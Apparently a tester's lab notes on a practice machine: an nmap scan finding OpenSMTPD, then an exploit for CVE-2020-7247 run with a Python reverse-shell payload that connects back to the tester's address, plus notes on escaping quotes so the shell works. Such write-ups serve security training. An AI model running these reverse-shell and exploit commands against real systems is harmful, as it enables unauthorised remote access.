```
nmap -sC -sV 192.168.247.71
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-01 09:08 CDT
Nmap scan report for 192.168.247.71
Host is up (0.043s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbdd2cea2f85c589bcfce9a338f0d750 (RSA)
|   256 e3b765c2a78e4529bb62ec301aebed6d (ECDSA)
|_  256 d55b795bce48d85746db594fcd455def (ED25519)
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.216], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m26s, deviation: 2h18m35s, median: 25s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-08-01T14:09:02
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2023-08-01T10:09:03-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.91 seconds

```

https://vk9-sec.com/opensmtpd-6-6-1-remote-code-execution-smtp_mailaddr-cve-2020-7247/ Found an exploit for previous versions of this SMTP service.

```
python3 47984.py 192.168.247.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.216\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
```

This gave me a reverse shell 

## NOTES!!!!
Sometimes the payload will not send properly and we need to escape quotes to make sure it is sent. example

``` Fail
python3 47984.py 192.168.247.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.216",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")"'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

```

The above does not result in a shell.

```success
python3 47984.py 192.168.247.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.216\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

```

This one sends a shell. Just need to test that with some of these exploits.